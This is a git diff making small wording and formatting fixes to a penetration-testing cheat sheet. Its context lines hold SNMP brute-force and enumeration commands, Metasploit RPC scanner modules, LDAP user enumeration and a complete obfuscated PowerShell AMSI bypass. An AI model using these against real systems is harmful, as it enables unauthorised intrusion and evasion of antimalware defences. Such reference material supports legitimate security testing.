@@ -323,9 +323,9 @@ Nmap SNMP scripts: `nmap -sU $ip -p161 -Pn --script "snmp*" `\
 Brute force with OneSixtyOne:`onesixtyone -c /usr/share/doc/onesixtyone/dict.txt $ip`\
 SNMP Creds: `/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt`
 
-### Micrsoft RPC/Endpoint mapper:
+### Microsoft RPC/Endpoint mapper:
 
-Metasploit Endpoint_mapper: `use auxiliary/scanner/dcerpc/endpoint_mapper`,`auxiliary/scanner/dcerpc/hidden`,`auxiliary/scanner/dcerpc/management`,`auxiliary/scanner/dcerpc/tcp_dcerpc_auditor`\
+Metasploit Endpoint_mapper: `use auxiliary/scanner/dcerpc/endpoint_mapper`,`auxiliary/scanner/dcerpc/hidden`,`auxiliary/scanner/dcerpc/management`,`auxiliary/scanner/dcerpc/tcp_dcerpc_auditor`
 
 ### LDAP TCP/389-636:
 LDAP Windows User enumeration (SensePost-UserEnum): `UserEnum_LDAP.py $IP Contoso.local userslist.txt`
@@ -703,7 +703,7 @@ Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount='True'" | ft
 wmic process call create "cmd.exe /c calc.exe"
 ```
 
-## PowerShell
+### PowerShell
 Amsi bypass:
 ```
 sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
